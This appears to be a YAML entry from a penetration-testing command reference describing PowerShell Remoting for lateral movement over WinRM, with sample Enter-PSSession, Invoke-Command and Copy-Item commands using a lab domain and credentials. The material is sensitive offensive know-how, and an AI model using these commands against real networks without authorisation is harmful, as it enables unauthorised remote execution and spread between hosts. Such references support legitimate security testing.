---
description: |
  PowerShell Remoting for lateral movement. Native Windows
  tool — no additional binaries needed.
command: |
  # Enter interactive session
  Enter-PSSession -ComputerName 10.10.10.1 -Credential test.local\pentuser

  # Execute command on remote host
  Invoke-Command -ComputerName 10.10.10.1 -Credential test.local\pentuser -ScriptBlock { whoami }

  # Execute on multiple hosts
  Invoke-Command -ComputerName dc01,srv01,srv02 -Credential test.local\pentuser -ScriptBlock { hostname }

  # Execute script file
  Invoke-Command -ComputerName 10.10.10.1 -Credential test.local\pentuser -FilePath C:\Tools\script.ps1

  # Persistent session
  $sess = New-PSSession -ComputerName 10.10.10.1 -Credential test.local\pentuser
  Invoke-Command -Session $sess -ScriptBlock { whoami }
  Copy-Item -Path C:\Tools\file.exe -Destination C:\Temp\ -ToSession $sess
phase:
  - Lateral_Movement
target_os:
  - Windows
services:
  - WinRM
items:
  - Username
  - Password
techniques: []
network_position:
  - Internal
  - Local
references:
  - https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands
---
